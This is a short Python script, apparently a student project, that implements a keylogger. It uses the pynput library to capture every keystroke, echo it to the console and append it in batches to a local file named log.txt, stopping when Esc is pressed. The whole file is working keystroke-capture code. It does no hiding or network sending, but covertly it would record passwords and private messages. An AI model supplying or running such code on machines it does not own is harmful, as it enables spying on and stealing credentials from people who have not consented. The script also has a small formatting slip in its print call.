#_____Simple keylogger for project______

#______Importing libraries_____
#______Using pynput library to listen to keyboard inputs_____

import pynput
from pynput.keyboard import Key, Listener

#_____Initializing values_____
count = 0
keys = []

#______Function for regestring keys pressed______
def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed",format(key))

    #_____Use to write file after every time the key count gets over the limit_____
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

#_____Function for writing keys in a text file______
def write_file(keys):
    with open("log.txt", "a") as f:
        #_____Making the text file more readable_____
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("enter") == -1:
                f.write(k)

#______Funcion for ending key registration______
def on_release(key):
    if key == Key.esc:
        return False

#______Main function______
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
